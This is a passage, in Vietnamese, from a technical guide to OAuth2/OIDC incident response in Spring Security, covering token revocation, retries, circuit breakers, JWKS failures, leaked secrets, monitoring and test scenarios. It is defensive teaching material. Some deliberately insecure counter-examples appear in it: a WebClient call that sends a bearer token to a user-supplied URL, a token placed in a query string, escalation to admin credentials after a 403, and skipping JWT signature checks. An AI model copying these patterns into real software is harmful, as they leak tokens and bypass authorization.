    REAUTH_REQUIRED --> ACTIVE: new authorized grant
    DISCONNECTED --> ACTIVE: explicitly linked again
~~~

### 16.1. ACTIVE khác DEGRADED

`DEGRADED` nói provider/API tạm không hoạt động; credential có thể vẫn hợp lệ. **Không tự đổi mọi DEGRADED thành REAUTH_REQUIRED**.

### 16.2. SUSPENDED phải chặn mọi outbound use

Nếu một API gateway chỉ ẩn nút UI nhưng background scheduler vẫn load Refresh Token và gọi API, containment thất bại. Mọi entrypoints (controllers, async jobs, queues, scheduled jobs) cần kiểm tra **shared connection state** trước khi authorize/gọi Resource Server.

### 16.3. Chống stale workers

Một node có thể đã load authorized client trước khi incident service đặt `SUSPENDED`. Nên có:

- Shared state/flag versioned.
- Recheck ngay trước operation nhạy cảm.
- Cache invalidation khi trạng thái thay đổi.
- Bounded TTL cho in-memory copies.
- Transaction/compare-and-swap để không active lại connection bằng stale response.

## 17. User thu hồi quyền: nhận biết và tôn trọng

Quyền có thể được thu hồi khi:

- User chọn “Remove access” ở OP.
- Admin revoke grant hoặc disable application.
- Provider khóa/disable user account.
- Client registration bị xóa hoặc scopes bị rút.
- Provider áp dụng conditional access/consent policy mới.
- OIDC Back-Channel Logout kết thúc OP/RP session (không nhất thiết revoke mọi Refresh Token).

### 17.1. Access Token còn hạn nhưng Refresh Token đã revoke

Một Access Token đã phát hành có thể vẫn hợp lệ đến khi hết hạn, trong khi Refresh Token không còn dùng được. Chương trình **không được tiếp tục sync vô thời hạn** sau khi phát hiện grant đã bị thu hồi; cần tôn trọng trạng thái quyền theo hợp đồng provider, đồng thời phân biệt token expiration và provider revocation propagation.

### 17.2. Không tự đổi registration quyền cao hơn

Phản ví dụ:

~~~text
reports.read token bị 403
  -> ứng dụng tự thử admin-service client credentials
  -> thực hiện thao tác với đặc quyền hệ thống
~~~

Đây có thể là **confused deputy/privilege escalation**. Nếu user đã thu hồi delegated permission, backend không được vượt qua bằng machine token quyền cao trừ một workflow hoàn toàn khác có authorization và audit rõ ràng.

### 17.3. Re-consent phải do user/policy quyết định

Một UI phù hợp:

> Kết nối với nhà cung cấp đã hết hiệu lực hoặc quyền truy cập bị thay đổi. Hãy kết nối lại để tiếp tục đồng bộ.

Không yêu cầu user nhập mật khẩu OP vào form của RP. Dẫn tới official Authorization Endpoint qua Spring Security OAuth2 Authorization Code flow với `state`/PKCE.

### 17.4. Quyền bị revoke không phải lỗi có thể tự retry mãi

Nếu `invalid_grant` lặp sau refresh, dừng grant attempts, chuyển sang REAUTH_REQUIRED và alert nếu số lượng tăng đột biến. Retry mãi có thể tạo account lock/rate limit và che khuất sự cố.

## 18. Provider outage: nguyên tắc bảo toàn trạng thái

Một OP hoặc Authorization Server có thể xảy ra:

- DNS resolution failure, network partition, TLS handshake timeout.
- HTTP 429 rate limit, 502/503/504 gateway errors.
- Token Endpoint hoặc UserInfo Endpoint unavailable.
- OIDC Discovery/JWKS endpoint unreachable.
- Key rotation/JWKS propagation delay.
- Provider incident thông báo qua status page.
- Partial outage: Token Endpoint lỗi nhưng Resource Server vẫn chạy.

**Tạm lỗi provider không tự có nghĩa token bị revoke hay provider bị compromise.** Hành động cần dựa trên endpoint, error category, độ dài sự cố và mức độ nhạy cảm.

### 18.1. Khi OP login endpoint down

User mới có thể không đăng nhập được. Hiển thị trang lỗi an toàn, không rơi về chế độ “không cần đăng nhập” và không tự tin JWT chưa verify.

Với sessions đã authenticated, quyết định tiếp tục phục vụ **local, non-sensitive functions** tùy business/security policy. Không mặc nhiên mở quyền mới vì OP không available.

### 18.2. Token Endpoint down

Đối với Access Token còn hiệu lực, một số API requests có thể vẫn hoạt động. Với token cần refresh, phải báo lỗi tạm thời và chờ retry theo policy; **không xóa Refresh Token** chỉ vì timeout.

### 18.3. Resource Server down

Provider có thể vẫn cấp token tốt trong khi downstream API 503. Không tự lặp xin Access Token chỉ để khắc phục lỗi hạ tầng của Resource Server.

### 18.4. UserInfo down

Nếu UserInfo là một phần bắt buộc trong login contract, login có thể thất bại/degrade. Không tự chế `OidcUser` với data lấy từ endpoint khác chưa xác minh; policy xử lý optional vs required claims phải rõ từ thiết kế.

## 19. Retry policy an toàn: không áp dụng chung cho mọi lỗi

| Lỗi | Retry? | Lưu ý |
| --- | --- | --- |
| Network timeout tới OP | Có thể, giới hạn | Phân biệt request đã được OP xử lý |
| HTTP 429 | Có, theo `Retry-After`/backoff | Tránh thundering herd |
| HTTP 503/502/504 | Có thể, giới hạn | Circuit breaker, jitter |
| Token Endpoint `invalid_grant` | **Không** dùng token cũ vô hạn | Reauthorization/incident investigation |
| `invalid_client` | Không retry mãi | Sửa client secret/registration |
| `invalid_scope` | Không retry cùng scope | Sửa permission/consent |
| Resource Server 401 invalid_token | Cleanup stale client nếu phù hợp | Không tự retry POST vô hạn |
| Resource Server 403 insufficient_scope | Không dùng admin token để bypass | User/admin consent hợp lệ nếu có |
| Revocation Endpoint 503 | Retry sau, coi token còn tồn tại | RFC 7009 |
| Revocation Endpoint 200 | Không retry chỉ vì không có body | Đã đạt trạng thái revoke theo protocol |

### 19.1. Exponential backoff với jitter

Một công thức minh họa:

~~~text
delay = min(maxDelay, baseDelay * 2^attempt)
actualDelay = randomWithin(0, delay)
~~~

Mục tiêu là tránh hàng nghìn instances cùng gọi Token Endpoint mỗi giây sau khi provider khôi phục. Giới hạn attempts và có circuit breaker theo **provider endpoint/registration**, không chỉ một global breaker cho mọi Identity Providers.

### 19.2. Respect `Retry-After`

Nếu provider trả:

~~~http
HTTP/1.1 429 Too Many Requests
Retry-After: 30
~~~

hãy tuân theo provider contract và giới hạn concurrency. Không cần chính xác “30 giây cho mọi lỗi” nếu policy khác; thời điểm retry phải xuất phát từ response/structured config.

### 19.3. Retry không dành cho mọi HTTP method

Với GET thường ít side effects hơn. Với POST tạo báo cáo, chuyển tiền hoặc revoke token, phải xác định **idempotency** và trạng thái outcome unknown sau timeout. Đừng gửi lại một operation nhạy cảm vô hạn nếu server có thể đã xử lý.

## 20. Circuit breaker và bulkhead theo provider

~~~mermaid
flowchart LR
    A["Integration A"] --> C["Circuit Breaker: OP A"]
    B["Integration B"] --> D["Circuit Breaker: OP B"]
    C --> E["Token Endpoint A"]
    D --> F["Token Endpoint B"]
    C --> G["Fallback: error temporary / queue"]
    D --> H["Fallback: error temporary / queue"]
~~~

### 20.1. Circuit breaker không thay authorization

Khi breaker open, ứng dụng có thể tạm dừng token refresh hoặc profile sync. Không fallback sang:

- Anonymous access cho endpoint cần authentication.
- ID Token không còn validate.
- Token của provider khác.
- Client Credentials quyền cao hơn.
- Một credential hard-code trong source.

### 20.2. Bulkhead

Giới hạn concurrency theo provider/endpoint/tenant. Nếu Provider A chậm, không cho threads/connection pool bị chiếm hết khiến Provider B và chức năng nội bộ không sử dụng được.

### 20.3. Queue khi provider lỗi

Với công việc đồng bộ không cần realtime:

~~~text
Scheduled sync -> provider unavailable
             -> retryable event in queue
             -> exponential backoff + TTL
             -> dead-letter/alert khi quá hạn
~~~

Không đưa Access Token/Refresh Token plaintext vào queue payload. Queue chỉ nên chứa **connection key/operation ID**, rồi worker lấy credential từ encrypted authorized client store khi được phép.

## 21. OIDC Discovery và JWKS bị lỗi: không tắt kiểm tra chữ ký

Khi OP không trả JWKS, code thường bị cám dỗ:

~~~text
JWT verify failed vì JWKS unavailable
  -> accept token với signature validation disabled
~~~

Đây là **lỗ hổng nghiêm trọng**. Không chấp nhận `alg=none`, arbitrary issuer, token với audience sai, token đã hết hạn hoặc public key do request cung cấp.

### 21.1. Cached signing keys

Framework/decoder có thể cache JWKS theo policy. Cached keys có thể giúp xử lý một số token đã phát trước đó khi provider tạm unavailable, **nếu token vẫn được validate đúng issuer/audience/expiry/algorithm và cache policy cho phép**.

Không dùng “cache vĩnh viễn” làm cách xử lý sự cố: provider có thể **rotate hoặc revoke signing keys vì compromise**. Cần tôn trọng cache semantics và có cơ chế cập nhật/recovery khi key ID mới xuất hiện.

### 21.2. Key rotation bình thường khác signing key compromise

| Tình huống | Hướng xử lý |
| --- | --- |
| OP thêm JWKS key mới | Refresh key cache theo metadata/trust config |
| OP dùng `kid` mới chưa propagate | Retry bounded fetch, alert, không bypass verify |
| OP phát hiện signing key bị chiếm | Làm theo incident advisory, reject compromised keys theo policy |
| OIDC issuer đổi bất ngờ | Không normalize để accept, xác minh thay đổi chính thức |
| TLS certificate của OP đổi | Xác minh chain/hostname và rollout trust config có kiểm soát |

### 21.3. Không auto-trust issuer mới từ token

JWT claim `iss` và header `jku`/`x5u` là dữ liệu chưa tin cậy trước validation. Không truy cập arbitrary URL ở đó để download signing key; đó là nguồn của token substitution, SSRF và false trust.

## 22. Client Secret hoặc private key bị lộ: không chỉ revoke user token

Nếu một **confidential OAuth2 client** bị lộ Client Secret:

1. Xác định registrations/tenants dùng secret đó.
2. Chặn truy cập trái phép, khóa credential nếu cần.
3. Rotate secret tại OP và secret manager, hỗ trợ giai đoạn overlap an toàn nếu OP cho phép.
4. Rollout các service instances mà không ghi secret vào logs.
5. Đánh giá có grant nào đã bị lạm dụng; xem xét revoke grants/Refresh Tokens liên quan.
6. Kiểm tra service-to-service Client Credentials tokens; làm mới token/keys khi cần.
7. Revoke secret cũ sau khi kiểm tra workloads chuyển sang secret mới.
8. Theo dõi `invalid_client` và attempts của client ID bị ảnh hưởng.

**Secret rotation không tự revoke mọi Access Token đã phát trước đó**, tùy OP/Resource Server.

### 22.1. Private key for `private_key_jwt`

Nếu private key dùng ký client assertion bị lộ, phải rotate/revoke key registration và đánh giá khả năng attacker đã ký assertions, chứ không chỉ xóa một session của user.

### 22.2. mTLS/DPoP sender-constrained tokens

RFC 9700 khuyến nghị sender-constrained Access Tokens để giảm replay; các phương án gồm **mTLS (RFC 8705)** và **DPoP (RFC 9449)** khi provider/client/Resource Server hỗ trợ.

Tuy nhiên:

- Nếu private key của sender cũng bị lộ, lợi ích sender constraint có thể mất.
- DPoP proof, nonce và key lifecycle phải thực hiện đúng contract.
- Không thể chỉ thêm một HTTP header tùy ý rồi tuyên bố token đã DPoP-bound.
- Sender-constraining phải được OP và Resource Server chấp nhận/kiểm tra.

## 23. Token bị lộ từ logs: cách xử lý thực tế

Một tình huống:

~~~text
DEBUG HTTP client logging:
  Authorization: Bearer eyJ...SENSITIVE...
~~~

**Việc đầu tiên không phải paste token vào ticket công khai**. Hãy:

1. Dừng nguồn log và cấu hình redaction.
2. Giới hạn quyền truy cập, retention và khả năng xuất log.
3. Xác định trong bao lâu, service/user/tenant nào bị ảnh hưởng.
4. Revoke hoặc quarantine token/grants theo risk.
5. Xem log access/audit để đánh giá dữ liệu đã bị tải xuống.
6. Xóa/khử nhạy cảm bản sao đã xuất hiện trong channels thích hợp; tuân theo quy định lưu chứng cứ.
7. Thêm tests/linter cho logging pipeline.

### 23.1. Những thứ không được ghi trong log

- `Authorization: Bearer ...`.
- Access Token, Refresh Token, ID Token raw.
- Client Secret, private keys, PKCE verifier, authorization code.
- Toàn bộ `OAuth2AuthorizedClient` hoặc `OAuth2AuthenticationToken`.
- Session cookie, CSRF token, UserInfo response chứa PII.
- Form body của Token/Revocation Endpoint.

Một structured event an toàn:

~~~text
event=oauth2_authorized_client_invalidated
registration_id=corporate
principal_type=user
tenant_alias=tenant-a
reason_category=provider_invalid_grant
action=reauth_required
correlation_id=internal-evt-7a42
~~~

Đây là **format minh họa**, không phải log mặc định của Spring Security. Nếu lưu principal identifiers, áp dụng masking/retention/access policy.

## 24. Ngăn token tiếp tục bị rò khi incident đang diễn ra

### 24.1. Không gửi token tới arbitrary destination

Phản ví dụ:

~~~java
webClient.get()
    .uri(userSuppliedUrl)
    .attributes(clientRegistrationId("admin-service"))
    .retrieve();
~~~

Code này có thể khiến Bearer Token được gửi tới host attacker. Cần:

- Host/scheme allowlist và DNS/redirect policy.
- WebClient chuyên dụng theo Resource Server.
- Không bật default OAuth2 client trên WebClient dùng nhiều URLs.
- Kiểm tra token audience và principal/tenant trước outbound request.

### 24.2. Redirect chain cần được kiểm soát

`baseUrl` không tự là host allowlist; một absolute URI có thể vượt qua base URL. Không mặc định HTTP client sẽ luôn xử lý `Authorization` header an toàn qua cross-host redirects. Hạn chế redirects với credential-bearing clients.

### 24.3. Đừng đặt token vào query string

Không:

~~~text
GET https://api.example.net/reports?access_token=REAL_TOKEN
~~~

Query strings thường rò qua logs, browser history, proxies và analytics. Dùng Authorization header theo Bearer usage, qua HTTPS, khi provider/API contract cho phép.

## 25. Incident data model và audit trail

Một mô hình dữ liệu ở mức ứng dụng:

~~~text
oauth2_connection
  id
  tenant_id
  principal_key
  registration_id
  state: ACTIVE | SUSPENDED | REVOKING |
         PENDING_REVOCATION | REAUTH_REQUIRED |
         DEGRADED | DISCONNECTED
  state_version
  last_error_category
  updated_at

oauth2_security_event
  id
  connection_id
  event_type
  severity
  detected_at
  action_taken
  correlation_id
~~~

Không đưa raw tokens vào audit table. Nếu phải giữ token để gửi revocation sau outage, dùng encrypted restricted storage riêng và lifecycle/ownership phù hợp.

### 25.1. Tại sao cần state version?

Một worker đang refresh có thể lưu Access Token mới sau khi incident service đã `SUSPENDED`. Nếu chỉ update state không kiểm tra version, worker có thể vô tình active lại connection.

~~~sql
-- SQL minh họa compare-and-swap, không phải migration hoàn chỉnh.
UPDATE oauth2_connection
SET state = 'SUSPENDED',
    state_version = state_version + 1
WHERE id = :connection_id
  AND state_version = :expected_version;
~~~

Nếu update ảnh hưởng 0 rows, có concurrent change; phải đọc lại và đối chiếu policy. Tương tự, khi provider xoay Refresh Token, cần atomic save/conditional deletion tránh mất token mới.

### 25.2. Tách token store khỏi security state

Một mô hình:

~~~text
Connection State Store
    |
    +-- ACTIVE? -> worker được phép gọi
    +-- SUSPENDED? -> chặn mọi use
    +-- REAUTH_REQUIRED? -> prompt re-consent
    +-- DEGRADED? -> retry theo policy

Encrypted Authorized Client Store
    |
    +-- Access/Refresh Token + registration/principal
~~~

Nếu process có quyền đọc encrypted store nhưng connection state đã SUSPENDED, vẫn phải **chặn sử dụng credential** trong application layer.

## 26. User experience và thông báo sự cố

Người dùng không nên nhìn thấy:

~~~text
OAuth2AuthorizationException:
invalid_grant, client_secret=...
refresh_token=...
~~~

Thay vào đó, thông báo cần khớp loại vấn đề:

| Trạng thái | Thông báo phù hợp |
| --- | --- |
| `REAUTH_REQUIRED` | “Kết nối đã hết hiệu lực. Vui lòng kết nối lại để tiếp tục.” |
| `DEGRADED` | “Nhà cung cấp đang gặp sự cố. Dữ liệu sẽ đồng bộ lại khi kết nối khôi phục.” |
| `SUSPENDED` do rủi ro | “Kết nối đã được tạm dừng để bảo vệ tài khoản. Vui lòng thực hiện bước xác minh.” |
| `PENDING_REVOCATION` | “Yêu cầu ngắt kết nối đang được xử lý; một số quyền có thể chưa được nhà cung cấp xác nhận thu hồi.” |
| `DISCONNECTED` | “Kết nối đã được ngắt theo chính sách.” |

### 26.1. Không đổ lỗi nhầm cho người dùng

Nếu OP 503, đừng thông báo “Bạn đã thu hồi quyền”. Nếu OP trả `invalid_grant`, đừng nói chắc chắn “Tài khoản bị đánh cắp”. Dùng ngôn ngữ trung tính và hướng dẫn bước tiếp theo.

### 26.2. Reconnect phải dùng official OAuth2 flow

Nút “Kết nối lại” chuyển user đến `/oauth2/authorization/{registrationId}` đã được cấu hình, theo đúng authorization request, `state`, PKCE và redirect URI. Không yêu cầu user nhập mật khẩu nhà cung cấp vào form của RP.

### 26.3. Tránh notification storm

Nếu outage ảnh hưởng hàng trăm nghìn connections, gộp thông báo theo incident và provider; không gửi một email mới cho mỗi lần token refresh thất bại. Các sự kiện confirmed credential compromise có thể yêu cầu quy trình thông báo khác, theo mức độ/luật và chính sách.

## 27. Monitoring và alerting nên theo dõi gì?

| Metric/Event | Ý nghĩa |
| --- | --- |
| `oauth2_token_refresh_success` theo provider | Refresh bình thường |
| `oauth2_token_refresh_invalid_grant` | Token/grant không hợp lệ hoặc rotation race |
| `oauth2_token_endpoint_invalid_client` | Client credential/method sai |
| `oauth2_api_invalid_token` | Resource Server từ chối Access Token |
| `oauth2_api_insufficient_scope` | API quyền chưa đủ |
| `oauth2_provider_5xx` | OP/AS outage |
| `oauth2_provider_429` | Rate limit |
| `oauth2_revoke_pending` / `success` | Theo dõi revocation backlog |
| `oauth2_connection_suspended` | Containment scope |
| `oauth2_reauth_required` | Số connections cần người dùng can thiệp |
| `oauth2_jwks_refresh_failure` | Signing key discovery/rotation issue |
| `oauth2_token_leak_detection` | Secret scanner hoặc audit signal |

### 27.1. Alert khác metric dashboard

Một số tín hiệu cần cảnh báo nhanh:

- Đột biến `invalid_grant` của nhiều users cùng provider.
- `invalid_client` đồng thời ở mọi pod sau secret rotation.
- Các Token Endpoint timeouts tăng sau deployment.
- Bất thường trong việc dùng token từ IP/geo/device trái hợp đồng.
- KMS decrypt activity bất thường đi kèm DB exfiltration.
- Revocation queue tăng và vượt SLO.
- Một registration bất ngờ gọi Resource Server host chưa được phê duyệt.

### 27.2. Tránh high-cardinality labels và PII

Không dùng Access Token, Refresh Token, full `sub`, `jti` hay session ID làm metric labels. Dùng provider alias, error code, environment, connection state và số lượng tổng hợp; muốn drill-down thì dùng audit store có kiểm soát.

## 28. Điểm phối hợp giữa Dev, Security, Operations và Provider

| Nhóm | Trách nhiệm |
| --- | --- |
| Application team | Cô lập connection, sửa token flows, deploy changes, test |
| Security/Incident Response | Phân loại sự cố, bằng chứng, scope, notification policy |
| IAM/Identity team | Client registration, consent, grant revocation, secret/key rotation |
| SRE/Operations | Traffic management, retries, circuit breaker, provider status, rollout |
| Data/Privacy | Đánh giá dữ liệu bị ảnh hưởng và retention/notification |
| External Provider Support | Xác nhận token family revocation, incident behavior, OP constraints |

Không để một background job tự động “xóa mọi user credentials” chỉ vì provider status API báo sự cố, trừ khi incident command đã phê duyệt phạm vi.

### 28.1. Khi provider báo outage

Thông tin tối thiểu cần xác nhận:

- Endpoint/region/tenant nào bị ảnh hưởng?
- Là auth/login, Token Endpoint, JWKS, UserInfo hay downstream API?
- Provider có status page, incident ID và ETA/recovery guidance không?
- Có thay đổi client credentials, signing keys hoặc consent policy không?
- Cần rotation/reauthorization hay chỉ retry sau khi phục hồi?

Giữ khả năng vận hành trong degraded mode, nhưng **không bỏ qua xác thực**.

## 29. Kiểm thử failure và recovery

### 29.1. Test Token Endpoint

| Scenario | Kỳ vọng |
| --- | --- |
| Refresh thành công có token rotation | Save Access/Refresh Token mới atomically |
| `invalid_grant` vì token revoked | Không retry token cũ vô hạn; REAUTH_REQUIRED |
| `invalid_grant` do concurrent refresh | Không xóa token mới của request khác |
| `invalid_client` | Alert/config failure, không lặp Token Endpoint storm |
| `invalid_scope` | Không nâng scope tự động |
| HTTP 503 | Giữ credential, transient error/backoff |
| Network timeout | Có retry giới hạn, tránh mất local state |
| Client Secret rotate | Các pods dùng new secret sau rollout, old revoked an toàn |

### 29.2. Test Resource Server

| Scenario | Kỳ vọng |
| --- | --- |
| 200 với Access Token hợp lệ | Không refresh vô cớ |
| 401 + `invalid_token` | Handler remove stale client nếu policy và code thích hợp |
| 403 + `insufficient_scope` | Không tự chuyển sang admin registration |
| 403 business ACL | Trả forbidden theo contract, không xóa Refresh Token |
| 503 | API degraded, không xin token mới vô hạn |
| Cross-host redirect | Không gửi Bearer Token sang arbitrary host |
| Retry POST sau timeout | Không tạo side effects lặp |

### 29.3. Test incident workflow

| Scenario | Kỳ vọng |
| --- | --- |
| Quarantine một user connection | Jobs và controllers đều ngừng dùng token đó |
| Revocation 200 | Đánh dấu kết quả hợp lệ, cleanup local |
| Revocation 503 | Vẫn pending, không báo đã revoke |
| Revocation token đã invalid | 200 được xử lý idempotent |
| Revocation unsupported token type | Escalate/fallback theo provider contract |
| Quarantine rồi stale worker save | Không tự trở lại ACTIVE |
| Token leak qua log | Secret redaction test phát hiện |
| Multi-instance cache | Invalidation đến các nodes |
| OP compromised signing key | Không accept tokens ký bằng key bị revoke |
| OP down, existing session | Local security policy không bị bypass |

### 29.4. Mock OP khác production provider

Unit test manager bằng mock tokens không chứng minh OP thực tế hỗ trợ revocation, refresh rotation hay DPoP/mTLS. Cần provider sandbox/contract tests có client registration test, không đưa production secrets vào fixtures/logs.

### 29.5. Chaos tests có giới hạn

Trong môi trường được phép:

- Tạm chặn Token Endpoint / DNS để đo retry.
- Giả lập 429/503 và `Retry-After`.
- Tạo concurrent refresh của cùng authorized client.
- Kiểm tra circuit breaker không lan sang provider khác.
- Kiểm tra khôi phục sau outage không phát ra request burst.

Không chủ động sử dụng token người dùng thật hoặc revoke production grants để “test” nếu chưa có scope/approval vận hành.

## 30. Kịch bản thực tế

### Tình huống A — Access Token bị lộ trong HTTP access log

Một interceptor vô tình ghi `Authorization` header của WebClient.

**Xử lý:** tắt log, hạn chế truy cập bản ghi, xác định token scope/expiry, revoke nếu hỗ trợ, giám sát dấu hiệu dùng trái phép và bổ sung regression test redaction. Không chỉ xóa file log cục bộ và coi xong sự cố.

### Tình huống B — Refresh Token trong database backup bị lộ

Một snapshot chứa Refresh Tokens nhiều users.

**Xử lý:** cô lập store/backup, xác định phạm vi, đánh giá encryption keys và KMS access, revoke grants/token families khi cần, đẩy connections vào quarantine/reauth và xem xét nghĩa vụ thông báo. Rotation encryption key không tự revoke những Refresh Tokens đã bị lấy plaintext.

### Tình huống C — User thu hồi consent ở provider

Lần refresh tiếp theo trả `invalid_grant`.

**Xử lý:** dừng dùng Refresh Token cũ, xóa/quarantine local authorized client đúng principal, đánh dấu cần reconnect. Không âm thầm thử token quyền cao từ registration khác.

### Tình huống D — OP Token Endpoint trả 503

Hàng nghìn scheduled jobs cùng refresh.

**Xử lý:** giữ Refresh Tokens, circuit breaker/backoff/jitter và queue phù hợp. Không mark mọi user REAUTH_REQUIRED, không gọi lại mỗi 100 ms.

### Tình huống E — Hai requests refresh cùng token

Request A được R2, Request B dùng R1 cũ và nhận invalid_grant.

**Xử lý:** transaction/CAS hoặc single-flight để tránh B xóa R2 của A. Quan sát OP replay policy, không kết luận theft chỉ từ một race.

### Tình huống F — API 403 sau khi admin đổi permissions

Reports API trả `insufficient_scope`.

**Xử lý:** xác nhận quyền mới, cập nhật consent/registration theo quy trình; không tự chuyển sang admin client credentials hoặc retry vô hạn.

### Tình huống G — Client Secret bị commit lên public repository

Machine Client Credentials application có thể bị mạo danh.

**Xử lý:** rotate/revoke client secret tại OP, rollout mọi instances, thu hồi grants/tokens bị ảnh hưởng theo provider support, kiểm tra repo history/scanner và audit token issuance. Xóa commit hiện tại không làm secret cũ an toàn trở lại.

### Tình huống H — OP JWKS endpoint unreachable

User login với ID Token ký bằng `kid` chưa có trong cache.

**Xử lý:** không bỏ JWT signature verification; dùng bounded retry/key refresh theo trust policy, hiển thị lỗi tạm thời hoặc fail closed. Không lấy public key từ JWT header URL của attacker.

### Tình huống I — User logout nhưng API còn chấp nhận JWT

RP session invalid, Access Token còn hạn.

**Xử lý:** giải thích session invalidation khác revocation; thiết kế TTL, introspection/denylist hoặc OP token revoke theo contract và risk.

### Tình huống J — Revocation Endpoint 503 trong khi user bấm Disconnect

App xóa Refresh Token ngay rồi gọi revoke thất bại.

**Xử lý:** thay bằng state REVOKING/PENDING_REVOCATION, encrypted pending queue, bounded retry; không cam kết provider đã revoke khi chưa nhận xác nhận.

### Tình huống K — DPoP key cũng bị lộ

Access Token sender-constrained nhưng attacker có key tương ứng.

**Xử lý:** coi sender-binding không còn bảo đảm, revoke token/key/registration theo policy. Không giả định DPoP bảo vệ khi private key đã bị lấy.

### Tình huống L — Logout Corporate xóa token của Partner

Ứng dụng xóa mọi authorized clients theo email user.

**Xử lý:** scope đúng issuer/registration/principal/tenant, giữ connection lifecycle độc lập; email không phải stable identity key.

### Tình huống M — Provider A outage nhưng Provider B vẫn tốt

Một global circuit breaker chặn hết OIDC Login.

**Xử lý:** bulkhead/circuit breaker theo issuer/registration, không lan lỗi A sang B nếu business trust policy cho phép B hoạt động độc lập.

### Tình huống N — Browser có session bị chiếm

Attacker sử dụng `JSESSIONID` của user.

**Xử lý:** invalidation local session, kiểm tra cookie/XSS/CSRF, step-up/re-auth; nếu có token compromise phụ trợ, xử lý OAuth2 revocation riêng.

## 31. Checklist ứng phó trước production

| Câu hỏi | Điều phải có |
| --- | --- |
| Có phân loại Access/Refresh/Client Secret/private key? | Incident playbooks riêng |
| Token có bị log không? | Header/body redaction, tests |
| Token được lưu đâu? | JDBC, sessions, Redis, backups inventory |
| Có mã hóa token at rest? | Encrypted store, KMS policy, key rotation |
| Quarantine chặn mọi workers? | Shared state, TTL, version |
| Xóa local có được phân biệt revoke? | RFC 7009 workflow rõ |
| OP hỗ trợ `revocation_endpoint`? | Discovery/provider contract |
| Revocation 200 được hiểu đúng? | Success hoặc token invalid |
| Revocation 503 được hiểu đúng? | Token có thể còn tồn tại |
| `invalid_grant` được xử lý? | Reauth, concurrency, replay investigation |
| `invalid_client` có alert? | Secret/key rotation workflow |
| 401/403 có phân loại Bearer error? | Không xóa bừa/không nâng quyền |
| Manager/filter dùng đúng repository/service? | Wiring review |
| WebClient host/redirect có allowlist? | Chống token exfiltration/SSRF |
| Refresh rotation có atomic persistence? | CAS/single-flight |
| Token Endpoint outage? | Backoff/jitter/circuit breaker |
| OP/JWKS outage? | Không bypass JWT validation |
| Có metrics không lộ PII? | Provider/error buckets, sanitized audit |
| Multi-tenant isolation? | Key issuer/registration/principal/tenant |
| User-facing message đúng lỗi? | Reauth vs degraded vs quarantine |
| Có provider escalation contacts? | Incident runbook/owner |
| Có tests cho revoke/timeout/race? | Mock OP + integration + chaos |
| Có chính sách khôi phục và thông báo? | Approval, evidence, retrospective |

## 32. Câu hỏi ôn tập

**1. Một Resource Server trả HTTP 401 có chứng minh Access Token bị đánh cắp không?**

Không. Token có thể hết hạn, sai issuer/audience hoặc đã bị revoke. Xem Bearer error, provider contract và tín hiệu bảo mật bổ sung.

**2. Lỗi `invalid_grant` có phải luôn do attacker replay Refresh Token?**

Không. Có thể do user revoke consent, token hết hạn hoặc concurrent refresh race. Cần phân loại và điều tra.

**3. Vì sao không xóa Refresh Token trước khi gọi revoke endpoint?**

Vì nếu provider timeout/503, app có thể mất credential duy nhất để gửi revoke lại. Cần quarantine/encrypted pending revocation workflow phù hợp.

**4. HTTP 200 từ RFC 7009 có nghĩa token từng tồn tại không?**

Không. Endpoint cũng trả 200 nếu token đã không hợp lệ, tránh tiết lộ trạng thái tồn tại.

**5. Nếu Token Endpoint 503, có nên xóa authorized client?**

Không mặc định. Đây là transient failure; giữ trạng thái và retry giới hạn. Xóa có thể khiến nhiều users buộc re-consent không cần thiết.

**6. `removeAuthorizedClient` có revoke ở OP không?**

Không. Nó chỉ tác động store local của Spring Security. Revocation Endpoint là protocol riêng.

**7. OIDC logout có đảm bảo Access Token JWT ngừng dùng tại API không?**

Không. Local/OP session logout và Access Token revocation có vòng đời khác nhau.

**8. Vì sao filter constructor nhận manager cần được kiểm tra?**

Vì một số Servlet/Reactive WebClient filters không tự forward Resource Server 401/403 vào failure handler khi khởi tạo bằng manager; cần cấu hình nếu muốn cleanup.

**9. Khi OP JWKS bị lỗi có được chấp nhận token chưa verify để duy trì uptime không?**

Không. Phải giữ signature/issuer/audience/expiry validation, có thể degrade/fail closed theo policy.

**10. Sender-constrained Access Token có chống được mọi vụ đánh cắp không?**

Không. Nó giảm khả năng replay nếu attacker thiếu sender key; nếu key cũng bị lộ hoặc implementation sai, rủi ro còn tồn tại.

## 33. Tài liệu tham khảo

- OAuth 2.0 Security Best Current Practice — RFC 9700: https://www.rfc-editor.org/rfc/rfc9700
- OAuth 2.0 Token Revocation — RFC 7009: https://www.rfc-editor.org/rfc/rfc7009
- OAuth 2.0 Bearer Token Usage — RFC 6750: https://www.rfc-editor.org/rfc/rfc6750
- OAuth 2.0 Authorization Framework — RFC 6749: https://www.rfc-editor.org/rfc/rfc6749
- OAuth 2.0 Token Introspection — RFC 7662: https://www.rfc-editor.org/rfc/rfc7662
- OAuth 2.0 Mutual-TLS Client Authentication and Certificate-Bound Access Tokens — RFC 8705: https://www.rfc-editor.org/rfc/rfc8705
- OAuth 2.0 Demonstrating Proof of Possession (DPoP) — RFC 9449: https://www.rfc-editor.org/rfc/rfc9449
- JSON Web Token Best Current Practices — RFC 8725: https://www.rfc-editor.org/rfc/rfc8725
- OpenID Connect Core 1.0: https://openid.net/specs/openid-connect-core-1_0.html
- OpenID Connect RP-Initiated Logout 1.0: https://openid.net/specs/openid-connect-rpinitiated-1_0.html
- OpenID Connect Back-Channel Logout 1.0: https://openid.net/specs/openid-connect-backchannel-1_0.html
- Spring Security — Servlet OAuth2 Client Core: https://docs.spring.io/spring-security/reference/servlet/oauth2/client/core.html
- Spring Security — Servlet OAuth2 Authorized Clients: https://docs.spring.io/spring-security/reference/servlet/oauth2/client/authorized-clients.html
- Spring Security — Reactive OAuth2 Client Core: https://docs.spring.io/spring-security/reference/reactive/oauth2/client/core.html
- Spring Security — Servlet OIDC Logout: https://docs.spring.io/spring-security/reference/servlet/oauth2/login/logout.html
- Spring Security — Reactive OIDC Logout: https://docs.spring.io/spring-security/reference/reactive/oauth2/login/logout.html
- Spring Security — `DefaultOAuth2AuthorizedClientManager` Javadoc: https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/client/web/DefaultOAuth2AuthorizedClientManager.html
- Spring Security — `ServerOAuth2AuthorizedClientExchangeFilterFunction` Javadoc: https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/client/web/reactive/function/client/ServerOAuth2AuthorizedClientExchangeFilterFunction.html
